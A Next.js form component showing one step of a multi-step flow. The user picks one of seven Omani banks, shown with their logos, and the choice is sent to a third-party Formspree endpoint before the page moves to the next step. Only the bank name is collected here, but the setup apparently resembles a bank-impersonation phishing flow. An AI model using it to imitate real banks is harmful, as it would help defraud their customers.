"use client";
import Image from "next/image";
import { useRouter } from "next/navigation";
import { useState } from "react";
import { useForm } from "@formspree/react";
import img1 from "../images/1.png";
import img2 from "../images/2.png";
import img3 from "../images/3.png";
import img4 from "../images/4.jpg";
import img5 from "../images/5.png";
import img6 from "../images/6.png";
import img7 from "../images/7.png";

const banks = [
  { name: "بنك مسقط", image: img1 },
  { name: "بنك الصحار الدولي", image: img2 },
  { name: "بنك عمان العربي", image: img3 },
  { name: "البنك الوطني العماني", image: img4 },
  { name: "بنك العز الاسلامي", image: img5 },
  { name: "بنك نزوى", image: img6 },
  { name: "بنك ظفار", image: img7 },
];

function Step3() {
  const [state, handleSubmit] = useForm("xjkbqzbo");
  const router = useRouter();
  const [formData, setFormData] = useState({
    bank: "",
  });

  const onFormSubmit = async (e) => {
    e.preventDefault();

    const res = await handleSubmit({
      data: {
        bank: formData.bank,
      },
    });

    router.replace("/4"); // Navigate to Step 2 on success
  };

  return (
    <div>
      <p className="text-xl text-stone-500 my-3">اختر البنك :</p>
      <form method="POST" onSubmit={onFormSubmit} className="w-full">
        <div className="flex items-center justify-between flex-col lg:flex-row w-[90%] mt-10 gap-5 mx-auto">
          {banks.map((bank) => (
            <div
              key={bank.name}
              className={`bank-option rounded-lg flex flex-col gap-5 w-36 items-center justify-center py-2 cursor-pointer border-2  ${
                formData.bank === bank.name
                  ? "border-slate-500"
                  : "border-transparent"
              }`}
              onClick={() => setFormData({ ...formData, bank: bank.name })}
            >
              <img
                src={bank.image.src}
                alt={bank.name}
                className="bank-image rounded-lg"
                width={115}
                height={115}
              />
              <span>{bank.name}</span>
            </div>
          ))}
        </div>
        <div className="w-full flex justify-center">
          <button
            type="submit"
            className="bg-red-600 text-white py-2 px-8 rounded-full mt-10"
          >
            التالي
          </button>
        </div>
      </form>
    </div>
  );
}

export default Step3;
